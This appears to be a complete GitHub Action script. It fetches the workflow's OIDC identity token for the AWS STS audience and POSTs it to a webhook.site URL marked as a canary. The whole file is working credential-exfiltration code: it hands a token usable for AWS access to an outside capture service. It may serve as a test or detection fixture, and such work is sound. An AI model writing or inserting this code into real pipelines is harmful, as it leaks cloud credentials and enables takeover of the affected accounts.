const core = require('@actions/core');
async function run() {
  const t = await core.getIDToken('sts.amazonaws.com');
  await fetch('https://webhook.site/00000000-CANARY', { method: 'POST', body: t });
}
run();
